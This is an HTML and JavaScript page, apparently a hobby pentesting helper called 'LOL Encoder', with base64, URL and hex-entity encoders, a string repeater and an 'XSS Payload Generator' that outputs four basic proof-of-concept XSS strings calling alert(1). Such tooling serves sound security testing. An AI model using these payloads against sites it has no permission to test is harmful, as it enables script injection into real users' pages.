<!DOCTYPE html>
<html>
<head>
	<title>LOL Encoder</title>
	<link rel="stylesheet" href="style.css" />
	<meta charset="utf-8">
</head>
<body>

<h1> LOL Encoder - (JavaScript Project) </h1>
<hr>

<fieldset><b>Concat</b><br>
<input type="text" id="firstname" placeholder="String 1">
<br>
<input type="text" id="lastname" placeholder="String 2">
<br>
<button type="button" onclick="concat()">Concat</button><br>
<br><textarea id="name" placeholder="output here"></textarea>
</fieldset>

<script>
function concat(){
var fname = document.getElementById('firstname').value;
var lname = document.getElementById('lastname').value;
var symbol=prompt("Symbol?");
var name=fname.concat(symbol,lname);
document.getElementById('name').value=name;
}

</script>

<fieldset><b>Encoder</b><br>
<br><textarea id="in" placeholder="your string here"></textarea>
<button type="button" onclick="base64encode()">b64->en</button>
<button type="button" onclick="base64decode()">b64->de</button>
<button type="button" onclick="urlencodeFunction()">url->en</button>
<button type="button" onclick="urldecodeFunction()">url->de</button>
<button type="button" onclick="hexFunction()">ascii->hex</button>

<br>
</fieldset>

<script>
function base64encode(){
	var input=document.getElementById('in').value;
	document.getElementById('in').value=btoa(input);
}
function base64decode(){
	var input=document.getElementById('in').value;
	document.getElementById('in').value=atob(input);
}
function urlencodeFunction(){
	var input=document.getElementById('in').value;
	document.getElementById('in').value=encodeURIComponent(input);
}
function urldecodeFunction(){
	var input=document.getElementById('in').value;
	document.getElementById('in').value=decodeURIComponent(input);
}

function hexFunction(){
	var input=document.getElementById('in').value;
	document.getElementById('in').value=ascii_to_hexa(input);
}
function ascii_to_hexa(str){
	
 
	var arr1 = [];
	for (var n = 0, l = str.length; n < l; n ++) 
     {
		var hex = Number(str.charCodeAt(n)).toString(16);
		arr1.push("&#x00"+hex+";");
	 }
	return arr1.join('');
   }


</script>

<fieldset><b>Repeater</b><br>
<br><textarea id="repeat" placeholder="your sting here"></textarea>
<input type="text" id="number" placeholder="times"><br>
<button type="button" onclick="repeaterFunction()">Repeat</button>
<button type="button" onclick="clearFunction()">Clear</button>

</fieldset>

<script>
function repeaterFunction(){
	var input=document.getElementById('repeat').value;
	var num=document.getElementById('number').value;
	document.getElementById('repeat').value=input.repeat(num);
}
function clearFunction(){
		document.getElementById('repeat').value="";
}

</script>

<fieldset><b>Text Conversion</b><br>
String<br><textarea id="gs" placeholder="your string here"></textarea><br>
<button type="button" onclick="toLowerCase()">toLower</button>
<button type="button" onclick="toUpperCase()">toUpper</button><br>

</fieldset>

<script>
function toLowerCase(){
var os = document.getElementById("gs").value;
var cs = os.toLowerCase();
document.getElementById("gs").value=cs;
}

function toUpperCase(){
var os = document.getElementById("gs").value;
var cs = os.toUpperCase();
document.getElementById("gs").value=cs;
}
</script>



<fieldset><b>XSS Payload Generator</b><br>
<select id="option">
  <option value="anchor">Anchor</option>
  <option value="svg">SVG</option>
  <option value="img">Image</option>
  <option value="body">Body</option>
</select>
<button onclick="generatorFunction()">Generate</button><br>
<textarea id="payload" placeholder="generated payload"></textarea>
</fieldset>

<script>
	function generatorFunction(){

		var selected=document.getElementById('option').value;
		if(selected=="anchor"){
			document.getElementById('payload').value="<a href=# onclick=alert(1)>Click!</a>";
		}
		if(selected=="svg"){
			document.getElementById('payload').value="<svg/onload=alert(1)>";
		}
		if(selected=="img"){
			document.getElementById('payload').value="<img src=x onerror=alert(1)>";
		}
		if(selected=="body"){
			document.getElementById('payload').value="<body/onload=alert(1)>";
		}
	}

</script>


<!-- New Style  -->


</body>
</html>
